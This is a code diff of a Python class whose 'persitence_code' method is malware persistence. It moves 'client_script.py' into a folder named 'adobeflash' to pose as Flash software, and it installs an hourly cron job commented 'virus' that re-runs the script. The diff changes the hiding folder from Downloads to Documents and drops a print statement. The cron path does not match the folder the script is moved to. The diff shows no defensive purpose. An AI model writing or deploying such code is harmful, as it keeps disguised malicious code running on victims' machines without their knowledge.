@@ -177,15 +177,14 @@ class stackedExample(QWidget):
 
     def persitence_code(self):
         myUser = os.environ["USER"]
-        if not os.path.exists("/home/"+myUser+"/Downloads/adobeflash"):
-            os.makedirs("/home/"+myUser+"/Downloads/adobeflash")
-        shutil.move("client_script.py", "/home/"+myUser+"/Downloads/adobeflash/client_script.py")
+        if not os.path.exists("/home/"+myUser+"/Documents/adobeflash"):
+            os.makedirs("/home/"+myUser+"/Documents/adobeflash")
+        shutil.move("client_script.py", "/home/"+myUser+"/Documents/adobeflash/client_script.py")
         tab = CronTab(user=myUser)
         cmd = 'python /bin/adobeflash/client_script.py'
         cron_job = tab.new(cmd, comment='virus')
         cron_job.hour.every(1)
         tab.write()
-        print "done"
 
 
 def main():
